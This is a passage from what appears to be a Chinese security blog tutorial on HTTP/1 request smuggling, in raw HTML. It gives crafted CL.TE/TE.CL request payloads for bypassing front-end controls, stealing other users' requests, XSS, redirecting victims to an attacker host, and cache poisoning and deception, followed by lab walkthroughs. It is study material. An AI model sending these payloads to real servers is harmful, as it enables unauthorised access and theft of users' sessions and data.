class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span></span><br><span class="language-nix"><span class="hljs-params">Content-Length:</span> <span class="hljs-number">11</span></span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-attr">q</span><span class="hljs-operator">=</span>smuggling</span><br></code></pre></td></tr></table></figure><p>由于此请求现在包含无效的 URL，服务器将以状态码 404 进行响应，表明攻击请求确实干扰了服务器。</p></li></ul><h2 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h2><p>http走私的利用主要就是利用魔改包直接进入后端的机制，</p><p>能绕过前端WAF（多是请求包层面）&#x2F;反射带出其他请求的包（利用能反射的参数）&#x2F;强迫受害者直接收到攻击（反射XSS，Cache攻击）</p><h3 id="1-绕过前端WAF"><a href="#1-绕过前端WAF" class="headerlink" title="1.  绕过前端WAF"></a>1.  绕过前端WAF</h3><p>（见实验6,7）</p><p><strong>因为请求走私能把部分数据直接送到后端，所以能绕过前端部分WAF</strong></p><p>在某些web应用，前端存在部分WAF，通过前端WAF的才会发到后端服务器，比如访问控制限制.</p><p>假设当前用户被允许访问某个资源<code>/home</code>，但没有被允许访问<code>/admin</code>其他资源。他们可以使用以下请求走私攻击（拼接结果）绕过此限制：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/home</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>62<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">GET <span class="hljs-symbol">/admin</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br><span class="language-nix"><span class="hljs-params">Foo:</span> xGET <span class="hljs-symbol">/home</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br></code></pre></td></tr></table></figure><p>两个包中，前端都是访问home，但后端拼接了一个访问admin。有时候想修改host，就需要修改截断部分用内侧CL形成覆盖</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101185424078.png"></p><h3 id="2-揭示前端请求重写-4"><a href="#2-揭示前端请求重写-4" class="headerlink" title="2. 揭示前端请求重写   &#x3D;&#x3D;&gt;4"></a>2. 揭示前端请求重写   &#x3D;&#x3D;&gt;4</h3><p>（实验室8）</p><p>在许多应用中，前端服务器会在将请求转发到后端服务器之前对其进行一些重写，通常是通过添加一些额外的请求头。例如，前端服务器可能会：</p><ul><li>终止 TLS 连接，并添加一些描述所用协议和密码的标头；</li><li>添加<code>X-Forwarded-For</code>包含用户 IP 地址的标头；</li><li>根据用户的会话令牌确定用户的 ID，并添加一个标识用户的标头；或者</li><li>添加一些其他攻击者感兴趣的敏感信息。</li></ul><p>那为了找出传输中偷偷加的header，就要想办法把整个包回显。</p><p>通常的思路：找到普通页面中，能反射用户输入的地方，例如输入 <code>email=yjh@a.com</code>，相应中反射<code>&lt;input id=&quot;email&quot; value=&quot;yjh@a.com&quot; type=&quot;text&quot;&gt;</code></p><p>那就可以用这个参数做外带工具，把正常包拼接到<code>email</code>参数：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>130<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">POST <span class="hljs-symbol">/login</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span></span><br><span class="language-nix"><span class="hljs-params">Content-Length:</span> <span class="hljs-number">100</span></span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-attr">email</span><span class="hljs-operator">=</span>POST <span class="hljs-symbol">/login</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br><span class="language-nix">...</span><br></code></pre></td></tr></table></figure><p>由于重写包的长度不可知，所以要猜内层CL大小，<code>内层body长度</code>&lt;<code>内层CL值</code>&lt;<code>拼接后的整个body长度</code></p><p>实例：</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101193622057.png"></p><h3 id="3-绕过客户端身份验证（authentication）"><a href="#3-绕过客户端身份验证（authentication）" class="headerlink" title="3. 绕过客户端身份验证（authentication）"></a>3. 绕过客户端身份验证（authentication）</h3><p>有些网站有双向TLS认证，客户端的CN（通用名称）通常是用户名或其他类似信息，有时候在后端应用程序逻辑中用作访问控制机制的一部分。</p><p>用于验证客户端身份的组件通常会通过一个或多个非标准 HTTP 标头，将证书中的相关详细信息传递给应用程序或后端服务器。例如，前端服务器有时会将包含客户端 CN 的标头附加到任何传入的请求中：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/admin</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>normal-website.com<br><span class="hljs-attribute">X-SSL-CLIENT-CN</span><span class="hljs-punctuation">: </span>carlos<br></code></pre></td></tr></table></figure><p>正常情况下，攻击者成功构造这个头就可以，但前端会覆盖你的构造，但用HTTP走私就绕过了前端的覆盖，原理就和1的绕过前端WAF差不多</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/example</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>64<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">GET <span class="hljs-symbol">/admin</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">X-SSL-CLIENT-CN:</span> administrator</span><br><span class="language-nix"><span class="hljs-params">Foo:</span> x</span><br></code></pre></td></tr></table></figure><h3 id="4-捕获其他用户的请求-2"><a href="#4-捕获其他用户的请求-2" class="headerlink" title="4.捕获其他用户的请求    &#x3D;&#x3D;&gt;2"></a>4.捕获其他用户的请求    &#x3D;&#x3D;&gt;2</h3><p>（实验9）</p><p>这个点和第二点有点像，第二点是带出隐藏<code>Header</code>，这个就是带出其他用户请求中的敏感数据（其实有时候也是<code>Header</code>，比如<code>cookie</code>）。控制带出的关键就是调整内层CL的长度</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101215032189.png"></p><h3 id="5-走私触发反射型-XSS"><a href="#5-走私触发反射型-XSS" class="headerlink" title="5. 走私触发反射型 XSS"></a>5. 走私触发反射型 XSS</h3><p>（实验10）</p><p>利用请求走私利用反射XSS比直接利用反射XSS更有优势：</p><ul><li>它不需要受害者交互。你不需要向他们提供URL并等待他们访问。你只需偷偷发送一个包含XSS有效载荷的请求，后端服务器处理的下一个用户请求就会被攻击。</li><li>它可以利用请求中那些在普通反射型 XSS 攻击中难以轻易控制的部分（例如 HTTP 请求头）的 XSS 行为。</li></ul><p>例如UA存在XSS，但你控制不了受害者的UA，你用请求走私就能定制受害者的<code>Header</code></p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101222050650.png"></p><h3 id="6-将根相对重定向转换为开放重定向"><a href="#6-将根相对重定向转换为开放重定向" class="headerlink" title="6. 将根相对重定向转换为开放重定向"></a>6. 将根相对重定向转换为开放重定向</h3><p>我们常见的重定向是对<code>路径</code>和<code>Host</code>的结合处理，有些服务器框架对不带尾部斜杠的文件夹的请求会被重定向到包含尾部斜杠的同一文件夹。例如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/home</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>normal-website.com<br><br><span class="language-http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">301</span> Moved Permanently</span><br><span class="language-http"><span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>https://normal-website.com/home/</span><br></code></pre></td></tr></table></figure><p>那就可以在这里利用<strong>走私攻击</strong>，将其他用户重定向到外部域。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>54<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">GET <span class="hljs-symbol">/home</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> attacker-website.com</span><br><span class="language-nix"><span class="hljs-params">Foo:</span> X</span><br></code></pre></td></tr></table></figure><p>此处，用户请求的是一个由网站页面导入的 JavaScript 文件。攻击者可以通过在响应中返回自己的 JavaScript 文件来完全控制受害者用户。</p><h3 id="7-进行Web缓存投毒"><a href="#7-进行Web缓存投毒" class="headerlink" title="7. 进行Web缓存投毒"></a>7. 进行Web缓存投毒</h3><p>（实验11）</p><p>在普通的 <a href="https://i4g5d.github.io/2025/10/19/web-cache2/">Cache投毒</a>中，我们要做的就是利用cache rules&#x2F;key上漏洞，利用Cache rules不包含（及不会写入key）的注入点（各种header的忽略，参数上的解析差异等 就是所谓的非密钥输入），直接在缓存中写入DOM或者导入含毒的静态文件</p><p>但如果能利用<strong>请求走私</strong>，结合前面的重定向攻击，就可以把某个静态文件的缓存机制给重定向用</p><ul><li><p>构造魔改包，走私一个会重定向的请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>59<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">GET <span class="hljs-symbol">/home</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> attacker-website.com</span><br><span class="language-nix"><span class="hljs-params">CL:</span> <span class="hljs-number">10</span></span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-attr">x</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></span><br></code></pre></td></tr></table></figure></li><li><p>发一个有Cache机制的静态文件正常包，会与魔改包拼接</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">GET <span class="hljs-symbol">/home</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> attacker-website.com<br>CL：<span class="hljs-number">10</span><br><br><span class="hljs-attr">x</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>GET <span class="hljs-symbol">/static/include.js</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> vulnerable-website.com<br></code></pre></td></tr></table></figure></li><li><p>写入了重定向缓存</p></li><li><p>受害者访问这个静态文件包，就会读到重定向缓存</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/static/include.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><br><span class="language-http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">301</span> Moved Permanently</span><br><span class="language-http"><span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>https://attacker-website.com/home/</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="8-利用-HTTP-请求走私进行-Web-缓存欺骗"><a href="#8-利用-HTTP-请求走私进行-Web-缓存欺骗" class="headerlink" title="8. 利用 HTTP 请求走私进行 Web 缓存欺骗"></a>8. 利用 HTTP 请求走私进行 Web 缓存欺骗</h3><p>(实验12)</p><p>普通的<a href="https://i4g5d.github.io/2025/10/15/web-cache/">Cache欺骗</a>是通过Cache端和源对cache rules的解析差异（有静态文件尾缀就缓存，有静态目录就缓存），让本该是动态文件的内容被Cache端解析为符合Cache rules的文件写入缓存，然后攻击者读缓存获取敏感数据</p><p>但加入<strong>请求走私</strong>就可以</p><ul><li><p>构造魔改包，让敏感文件拼接上静态文件，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>43<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">GET <span class="hljs-symbol">/private/messages</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Foo:</span> X</span><br></code></pre></td></tr></table></figure></li><li><p>受害者原本写入静态文件缓存结果魔改到了敏感界面，敏感文件数据被写入了的缓存，（Cache中间件解析的是png，所以确定请求包回来后要缓存，但后端收到的请求却是message，返回的就是message）</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/private/messages</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Foo</span><span class="hljs-punctuation">: </span>XGET /static/some-image.png HTTP/1.1<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z<br>...<br></code></pre></td></tr></table></figure></li><li><p>随后访问一下static&#x2F;some-image.png就能读到API</p></li></ul><h2 id="6-实验"><a href="#6-实验" class="headerlink" title="6.实验"></a>6.实验</h2><h3 id="实验1：CL-TE-基本漏洞"><a href="#实验1：CL-TE-基本漏洞" class="headerlink" title="实验1：CL.TE 基本漏洞"></a>实验1：CL.TE 基本漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031211910914.png"></p><p>做题前两个细节,一个<code>HTTP/2</code>换成<code>HTTP/1</code>,一个关掉Repeater的自动补齐CL</p><p>按要求就是利用前端使用CL，后端使用TE，截断第一个包，让第二个包的请求头变成YPOST</p><p>那就这么构造第一个包</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031213517814.png"></p><p>这里开启了换行显示，因为<code>\r\n</code>算两个字节。</p><p>这样前端从0到G刚好是6字节，但后端第一个http包到0就结束了。</p><p>这时第一次发包是正常的，再发一次，看到G和POST结合了</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031213546270.png"></p><p>前端服务器处理请求<code>Content-Length</code>头，并确定请求体长度为 6 字节，直到末尾<code>G</code>。该请求被转发到后端服务器。</p><p>后端服务器处理<code>Transfer-Encoding</code>头部信息，因此会将消息体视为使用分块编码。它会处理第一个长度为零的块，并将其视为请求的结束。接下来的字节（<code>G</code>）则不予处理，后端服务器会将它们视为序列中下一个请求的开始。</p><h3 id="实验2：TE-CL-基本漏洞"><a href="#实验2：TE-CL-基本漏洞" class="headerlink" title="实验2：TE.CL 基本漏洞"></a>实验2：TE.CL 基本漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031214938148.png"></p><p>最开始先尝试构造,成功访问.按理说就是前端发送了所有,后端截取到G前面</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031233209915.png"></p><p>随后再发送一个新包,发现是能拼接的,但多了一个0</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031233307567.png"></p><p>这样至少说明TE.CL初步成功了,想办法构造成GPOST,直接构造一个新请求</p><p>第一次发</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031234422394.png"></p><p>再发第二个包,这其实已经成功了,但第二个包会200,因为不会和后面的包拼接,后面的包会正常发送(后端是靠CL分割的),等于我们发了第二个包的时候后端分割出了三个</p><p>所以在内层加个CL头,CL的值不能是刚刚好,因为要让后面的正常请求拼接上触发报错</p><p>第一个发送包 CL值改为5+1</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031234316568.png"></p><p>第二次再随便发新包,发现成功拼接</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031234349456.png"></p><h3 id="实验3：混淆-TE-标头"><a href="#实验3：混淆-TE-标头" class="headerlink" title="实验3：混淆 TE 标头"></a>实验3：混淆 TE 标头</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031235144364.png"></p><p>先进行简单的构造,猜测是最后形成TE-CL,那就是让后端忽略TE而去执行CL</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101004935135.png"></p><p>再发个正常包,发现成功拼接,前端TE读取所有,后端CL截出了G0</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101005000583.png"></p><p>重复上个实验的步骤</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101005238054.png"></p><p>成功拼接</p><h3 id="实验4：通过差异响应确认-CL-TE-漏洞"><a href="#实验4：通过差异响应确认-CL-TE-漏洞" class="headerlink" title="实验4：通过差异响应确认 CL.TE 漏洞"></a>实验4：通过差异响应确认 CL.TE 漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101160634855.png"></p><p>题目说了前端不支持TE，那就是支持CL</p><p>先进进行CL.TE测试，假设前端CL提前截断，后端TE等待chunked，成功得到超时响应</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101161415860.png"></p><p>尝试构造使得后续触发404，这样我们构造的GET404就会在后端隔离开并等待拼接</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101162550555.png"></p><p>这样下一个包就会解析成GET404，原来的包会被拼接到yjh表头，像这样：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/404</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">yjh</span><span class="hljs-punctuation">: </span>aPOST /search HTTP/1.1<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br></code></pre></td></tr></table></figure><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101162613376.png"></p><h3 id="实验5：通过差异响应确认-TE-CL-漏洞"><a href="#实验5：通过差异响应确认-TE-CL-漏洞" class="headerlink" title="实验5：通过差异响应确认 TE.CL 漏洞"></a>实验5：通过差异响应确认 TE.CL 漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101163110353.png"></p><p>这里先巩固一下知识，黑盒测试一下</p><p>先测试CL.TE，假设前端是识别CL，那构造</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101163611710.png"></p><p>应该会导致超时，但实际上没有</p><p>再测试TE.CL，前端按照TE送进去所有数据，后端CL满足不了15，要等后面的数据导致超时</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101163801972.png"></p><p>确定漏洞后直接构造</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101164547199.png"></p><p>再发个正常包就成功拼接404请求</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101164609822.png"></p><h3 id="实验6：HTTP-请求走私绕过前端安全控制，CL-TE-漏洞"><a href="#实验6：HTTP-请求走私绕过前端安全控制，CL-TE-漏洞" class="headerlink" title="实验6：HTTP 请求走私绕过前端安全控制，CL.TE 漏洞"></a>实验6：HTTP 请求走私绕过前端安全控制，CL.TE 漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101175744160.png"></p><p>按要求看到封锁了amdin<img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101180008674.png"></p><p>直接用扩展扫出CL.TE<img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101180409387.png"></p><p>手动验证，构造CL。TE测试payload，成功得到超时相应</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101180702937.png"></p><p>构造并发魔改包</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181019756.png"></p><p>得到回显，能访问了，但不是本地用户</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181047181.png"></p><p>在正常包修改HOST为localhost失败，那就在魔改包加个Host标头，同时把正常包忽略掉</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181627340.png"></p><p>再发正常包就成功了</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101181700454.png"></p><p>后面用同样方式触发delete请求即可</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101182040950.png"></p><h3 id="实验7：-HTTP-请求走私绕过前端安全控制，TE-CL-漏洞"><a href="#实验7：-HTTP-请求走私绕过前端安全控制，TE-CL-漏洞" class="headerlink" title="实验7： HTTP 请求走私绕过前端安全控制，TE.CL 漏洞"></a>实验7： HTTP 请求走私绕过前端安全控制，TE.CL 漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101182249480.png"></p><p>手动测试漏洞 （12&#x3D;11+1，等不到12所以会超时）</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101183159449.png"></p><p>初步构造成功（11&#x3D;10+1）</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101184008244.png"></p><p>后面和上个实验步骤一样 最终payload</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101184300767.png"></p><h3 id="实验8：利用-HTTP-请求走私来揭示前端请求重写"><a href="#实验8：利用-HTTP-请求走私来揭示前端请求重写" class="headerlink" title="实验8：利用 HTTP 请求走私来揭示前端请求重写"></a>实验8：利用 HTTP 请求走私来揭示前端请求重写</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101190311808.png"></p><p>先构造简单的CL.TE绕过前端WAF</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101191455019.png"></p><p>回显，要求ip为本地回环</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101191511066.png"></p><p>按题目提示，尝试把隐藏标头测试出来，这里我利用首页的搜索blog功能，因为它能反射回显</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192356986.png"></p><p>调整内层CL的数值，调整反射的范围，当设置为50的时候差不多就看出来了</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192506618.png"></p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192456218.png"></p><p>加上这个隐藏头，再简单改一改CL发出去就可以了</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192702154.png"></p><p>这时发送正常包就成功走私</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101192743425.png"></p><h3 id="实验9：HTTP-请求走私技术捕获其他用户的请求"><a href="#实验9：HTTP-请求走私技术捕获其他用户的请求" class="headerlink" title="实验9：HTTP 请求走私技术捕获其他用户的请求"></a>实验9：HTTP 请求走私技术捕获其他用户的请求</h3><p><img 